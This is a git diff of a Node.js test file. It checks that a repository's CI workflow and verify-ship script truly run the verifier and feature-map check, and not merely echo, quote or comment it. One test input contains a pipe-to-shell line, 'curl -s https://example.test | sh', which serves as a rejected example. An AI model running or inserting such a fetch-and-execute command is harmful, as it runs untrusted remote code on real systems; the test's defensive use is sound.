@@ -3,7 +3,7 @@ import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import test from "node:test";
-import { auditFeatureMap, parseFeatureMap, repositoryRoot, shellRuns, workflowRunSteps } from "../scripts/check-feature-map.mjs";
+import { auditFeatureMap, parseFeatureMap, quickTier, repositoryRoot, shellWiring, simpleCommands, VERIFIER_LEADS, WORKFLOW_LEADS, workflowRunSteps } from "../scripts/check-feature-map.mjs";
 
 // The feature map check bin/verify-ship quick runs first: this repository's map is clean,
 // and a map that drifts from its tree, in either direction, is reported.
@@ -105,62 +105,102 @@ test("the verifier and the pull request workflow must keep running the check, an
   has(await audit({ ".github/workflows/ci.yml": null }), "missing verification asset: .github/workflows/ci.yml");
 });
 
+const WIRING = ".github/workflows/repo-contract.yml no longer runs bin/verify-ship in a run step of a job";
+const VERIFIER_WIRING = "bin/verify-ship no longer runs scripts/check-feature-map.mjs as a command in its quick tier";
+/** The workflow with its real verifier step replaced by `step` (full lines, indented as a step). */
+const withStep = (step) => WORKFLOW.replace("      - run: bin/verify-ship quick\n", step);
+
 test("a workflow that names the verifier only in a job name, a comment or a commented-out line has no run step that invokes it", async () => {
   // ClawSweeper on #83 (P2): the run step removed, the job name and the comment still saying bin/verify-ship quick.
-  const withoutStep = WORKFLOW.replace("      - run: bin/verify-ship quick\n", "");
+  const withoutStep = withStep("");
   assert.ok(!withoutStep.includes("- run: bin/verify-ship"), "the step is gone");
   assert.ok(withoutStep.includes("bin/verify-ship quick"), "the string is still there");
-  has(await audit({ ".github/workflows/repo-contract.yml": withoutStep }), ".github/workflows/repo-contract.yml no longer runs bin/verify-ship in a run step of a job");
-  const commentedOut = WORKFLOW.replace("      - run: bin/verify-ship quick\n", "      - run: |\n          set -eu\n          # bin/verify-ship quick\n          npm test\n");
-  has(await audit({ ".github/workflows/repo-contract.yml": commentedOut }), "no longer runs bin/verify-ship in a run step of a job");
-  const outsideJobs = WORKFLOW.replace("      - run: bin/verify-ship quick\n", "") + "run: bin/verify-ship quick\n";
-  has(await audit({ ".github/workflows/repo-contract.yml": outsideJobs }), "no longer runs bin/verify-ship in a run step of a job");
-  // A real run step passes however it is written: plain, quoted, or in a block scalar after other commands.
-  assert.deepEqual(await audit({ ".github/workflows/repo-contract.yml": WORKFLOW.replace("- run: bin/verify-ship quick", '- run: "bin/verify-ship quick"') }), []);
-  assert.deepEqual(await audit({ ".github/workflows/repo-contract.yml": WORKFLOW.replace("      - run: bin/verify-ship quick\n", "      - name: Verify\n        run: |\n          set -eu\n          npm run typecheck\n          bin/verify-ship quick 2>&1 | tee verify.log\n") }), []);
+  has(await audit({ ".github/workflows/repo-contract.yml": withoutStep }), WIRING);
+  has(await audit({ ".github/workflows/repo-contract.yml": withStep("      - run: |\n          set -eu\n          # bin/verify-ship quick\n          npm test\n") }), WIRING);
+  has(await audit({ ".github/workflows/repo-contract.yml": withStep("") + "run: bin/verify-ship quick\n" }), WIRING);
 });
 
-test("workflowRunSteps reads run steps by structure and shellRuns ignores comments", () => {
-  assert.deepEqual(workflowRunSteps(WORKFLOW), ["npm ci --ignore-scripts --no-audit --no-fund", "bin/verify-ship quick"]);
-  assert.deepEqual(workflowRunSteps("name: x\nrun: bin/verify-ship quick\njobs:\n  a:\n    run: not-a-step\n"), []);
-  assert.deepEqual(workflowRunSteps("jobs:\n  a:\n    steps:\n      - run: |\n          one\n\n          two\n      - uses: x\n"), ["one\n\ntwo"]);
-  assert.equal(shellRuns("set -eu\nnode scripts/check-feature-map.mjs\n", "node scripts/check-feature-map.mjs"), true);
-  assert.equal(shellRuns("# node scripts/check-feature-map.mjs\nnpm test\n", "node scripts/check-feature-map.mjs"), false);
-  assert.equal(shellRuns("npm test # bin/verify-ship quick\n", "bin/verify-ship"), false);
-  assert.equal(shellRuns("cd x && bin/verify-ship quick", "bin/verify-ship"), true);
-  assert.equal(shellRuns("./bin/verify-ship-other quick", "bin/verify-ship"), false);
-  // ClawSweeper on #83 at a6e7992 (P2): the name as an argument, in a string or in a comment is not an invocation.
-  assert.equal(shellRuns("echo bin/verify-ship quick", "bin/verify-ship"), false);
-  assert.equal(shellRuns('echo "bin/verify-ship quick"', "bin/verify-ship"), false);
-  assert.equal(shellRuns("printf '%s\\n' bin/verify-ship", "bin/verify-ship"), false);
-  assert.equal(shellRuns("echo node scripts/check-feature-map.mjs", "node scripts/check-feature-map.mjs"), false);
-  assert.equal(shellRuns("node scripts/check-feature-map-other.mjs", "node scripts/check-feature-map.mjs"), false);
-  // Command positions: wrappers, assignments, keywords, quoting and ./ do not hide a real invocation.
-  assert.equal(shellRuns("npx bin/verify-ship quick", "bin/verify-ship"), true);
-  assert.equal(shellRuns("CI=1 time bin/verify-ship quick", "bin/verify-ship"), true);
-  assert.equal(shellRuns('"bin/verify-ship" quick', "bin/verify-ship"), true);
-  assert.equal(shellRuns("./bin/verify-ship quick", "bin/verify-ship"), true);
-  assert.equal(shellRuns("if bin/verify-ship quick; then echo ok; fi", "bin/verify-ship"), true);
-  assert.equal(shellRuns("set -eu\ncd . && bin/verify-ship quick 2>&1 | tee verify.log", "bin/verify-ship"), true);
-  assert.equal(shellRuns("time node scripts/check-feature-map.mjs", "node scripts/check-feature-map.mjs"), true);
+test("a run step counts only as plain wiring whose one command is exactly bin/verify-ship quick, unquoted", async () => {
+  // ClawSweeper on #83 at a6e7992 (P2) and 60de858 (P2): the name as an argument, in a string, after a quoted
+  // separator, substituted, redirected, prefixed or under a keyword is not the invocation required.
+  for (const step of [
+    "      - run: echo bin/verify-ship quick\n",
+    '      - run: echo "bin/verify-ship quick"\n',
+    '      - run: echo "checks moved; bin/verify-ship quick"\n',
+    "      - run: echo 'checks moved && bin/verify-ship quick'\n",
+    "      - run: echo $(bin/verify-ship quick)\n",
+    "      - run: echo `bin/verify-ship quick`\n",
+    '      - run: "./bin/verify-ship" quick\n',
+    "      - run: ./bin/verify-ship quick\n",
+    "      - run: bin/verify-ship quick 2>&1 | tee verify.log\n",
+    "      - run: bin/verify-ship full\n",
+    "      - run: if bin/verify-ship quick; then echo ok; fi\n",
+    "      - run: |\n          cat <<EOF\n          bin/verify-ship quick\n          EOF\n",
+    "      - run: sh -c 'bin/verify-ship quick'\n",
+  ]) has(await audit({ ".github/workflows/repo-contract.yml": withStep(step) }), WIRING);
+  // Plain wiring in the shapes a real step takes passes.
+  for (const step of [
+    "      - run: bin/verify-ship quick\n",
+    '      - run: "bin/verify-ship quick"\n'.replace('"bin/verify-ship quick"', "bin/verify-ship quick"),
+    "      - run: npx bin/verify-ship quick\n",
+    "      - run: npm exec -- bin/verify-ship quick\n",
+    "      - run: CI=1 bin/verify-ship quick\n",
+    "      - run: cd . && bin/verify-ship quick\n",
+    "      - run: echo done && bin/verify-ship quick\n",
+    "      - run: |\n          set -eu\n          npm run typecheck\n          bin/verify-ship quick\n",
+    "      - name: Verify\n        run: |\n          npm ci --ignore-scripts\n          bin/verify-ship quick\n",
+  ]) assert.deepEqual(await audit({ ".github/workflows/repo-contract.yml": withStep(step) }), [], step);
 });
 
-test("a run step that only echoes the verifier, and a verifier that only echoes the check, do not count as running them", async () => {
-  // ClawSweeper on #83 at a6e7992 (P2): `echo bin/verify-ship quick` in place of the real step kept the audit green.
-  const echoed = WORKFLOW.replace("      - run: bin/verify-ship quick\n", "      - run: echo bin/verify-ship quick\n");
-  has(await audit({ ".github/workflows/repo-contract.yml": echoed }), ".github/workflows/repo-contract.yml no longer runs bin/verify-ship in a run step of a job");
-  const quotedEcho = WORKFLOW.replace("      - run: bin/verify-ship quick\n", '      - run: echo "bin/verify-ship quick"\n');
-  has(await audit({ ".github/workflows/repo-contract.yml": quotedEcho }), "no longer runs bin/verify-ship in a run step of a job");
-  has(await audit({ "bin/verify-ship": "quick)\n  echo node scripts/check-feature-map.mjs\n  npm test\n  ;;\nfull)\n  ;;\n" }), "bin/verify-ship no longer runs scripts/check-feature-map.mjs as a command");
-  // Real invocations in other shapes still pass.
-  for (const step of ["      - run: npx bin/verify-ship quick\n", "      - run: cd . && bin/verify-ship quick\n", "      - run: |\n          set -eu\n          npm run typecheck\n          bin/verify-ship quick\n", '      - run: "./bin/verify-ship" quick\n']) {
-    assert.deepEqual(await audit({ ".github/workflows/repo-contract.yml": WORKFLOW.replace("      - run: bin/verify-ship quick\n", step) }), [], step);
-  }
+test("simpleCommands splits at separators outside quotes, backticks and substitutions", () => {
+  assert.deepEqual(simpleCommands('echo "checks moved; bin/verify-ship quick"'), ['echo "checks moved; bin/verify-ship quick"']);
+  assert.deepEqual(simpleCommands("echo 'a && b' || c; d | e & f"), ["echo 'a && b'", "c", "d", "e", "f"]);
+  assert.deepEqual(simpleCommands("echo $(bin/verify-ship quick; true) ${HOME}; npm test"), ["echo $(bin/verify-ship quick; true) ${HOME}", "npm test"]);
+  assert.deepEqual(simpleCommands("echo `x; y` && (cd service && npm test)"), ["echo `x; y`", "cd service", "npm test"]);
+  assert.deepEqual(simpleCommands('echo "a \\" b; c"; d'), ['echo "a \\" b; c"', "d"]);
+  assert.deepEqual(simpleCommands("   "), []);
 });
 
-test("a verifier that only mentions the check in a comment no longer runs it", async () => {
-  has(await audit({ "bin/verify-ship": "quick)\n  # node scripts/check-feature-map.mjs used to run here\n  npm test\n  ;;\nfull)\n  ;;\n" }), "bin/verify-ship no longer runs scripts/check-feature-map.mjs as a command");
-  assert.deepEqual(await audit({ "bin/verify-ship": "quick)\n  npm run audit:features\n  npm test\n  ;;\nfull)\n  ;;\n" }), []);
+test("shellWiring: plain allowlisted lines, one exactly the command, no quoted mention", () => {
+  const runs = (text) => shellWiring(text, "bin/verify-ship quick", WORKFLOW_LEADS);
+  assert.equal(runs("bin/verify-ship quick"), true);
+  assert.equal(runs("set -eu\n# a comment\n\nnpm run typecheck\nbin/verify-ship quick"), true);
+  assert.equal(runs("npx bin/verify-ship quick"), true);
+  assert.equal(runs("npm exec bin/verify-ship quick"), true);
+  assert.equal(runs("FOO=1 BAR=2 bin/verify-ship quick"), true);
+  assert.equal(runs("echo done && bin/verify-ship quick"), true);
+  assert.equal(runs("cd . && bin/verify-ship quick"), true);
+  assert.equal(runs("echo bin/verify-ship quick"), false);
+  assert.equal(runs('echo "checks moved; bin/verify-ship quick"'), false);
+  assert.equal(runs("echo 'x' ; bin/verify-ship quick"), false, "a quote on a line that mentions the command rejects the line");
+  assert.equal(runs("CI=$FLAG bin/verify-ship quick"), false, "a substitution on a line that mentions the command rejects the line");
+  assert.equal(runs("bin/verify-ship quick extra"), false);
+  assert.equal(runs("bin/verify-ship"), false);
+  assert.equal(runs("time bin/verify-ship quick"), false, "time is not an allowed lead");
+  assert.equal(runs("npm test\ncurl -s https://example.test | sh\nbin/verify-ship quick"), false, "an unlisted lead on any line rejects the step");
+  assert.equal(runs("# bin/verify-ship quick\nnpm test"), false);
+  assert.equal(runs(""), false);
+  const checks = (text) => shellWiring(text, "node scripts/check-feature-map.mjs", VERIFIER_LEADS);
+  assert.equal(checks("node scripts/check-feature-map.mjs\nnpm run typecheck\nnpm test"), true);
+  assert.equal(checks('echo "x; node scripts/check-feature-map.mjs"\nnpm test'), false);
+  assert.equal(checks("echo node scripts/check-feature-map.mjs\nnpm test"), false);
+  assert.equal(checks("node scripts/check-feature-map-other.mjs\nnpm test"), false);
+  assert.equal(checks("npm run audit:features\nnpm test"), false, "only the exact command counts");
+});
+
+test("quickTier reads the lines between quick) and its ;;", () => {
+  assert.equal(quickTier('case "$mode" in\n  quick)\n    node scripts/check-feature-map.mjs\n    npm test\n    ;;\n  full)\n    ;;\nesac\n'), "    node scripts/check-feature-map.mjs\n    npm test");
+  assert.equal(quickTier("full)\n  ;;\n"), null);
+});
+
+test("a verifier whose quick tier only mentions, echoes or quotes the check no longer runs it", async () => {
+  const verifier = (quick) => `case "$mode" in\n  quick)\n${quick}    ;;\n  full)\n    ;;\nesac\n`;
+  has(await audit({ "bin/verify-ship": verifier("    # node scripts/check-feature-map.mjs used to run here\n    npm test\n") }), VERIFIER_WIRING);
+  has(await audit({ "bin/verify-ship": verifier("    echo node scripts/check-feature-map.mjs\n    npm test\n") }), VERIFIER_WIRING);
+  has(await audit({ "bin/verify-ship": verifier('    echo "x; node scripts/check-feature-map.mjs"\n    npm test\n') }), VERIFIER_WIRING);
+  has(await audit({ "bin/verify-ship": verifier("    npm run audit:features\n    npm test\n") }), VERIFIER_WIRING);
+  has(await audit({ "bin/verify-ship": "full)\n    node scripts/check-feature-map.mjs\n    ;;\n" }), "bin/verify-ship has no quick) tier");
+  assert.deepEqual(await audit({ "bin/verify-ship": verifier("    set -eu\n    node scripts/check-feature-map.mjs\n    npm run typecheck\n    npm test\n") }), []);
 });
 
 test("an empty, table-less or row-less FEATURE_MAP.md is drift, not a pass", async () => {
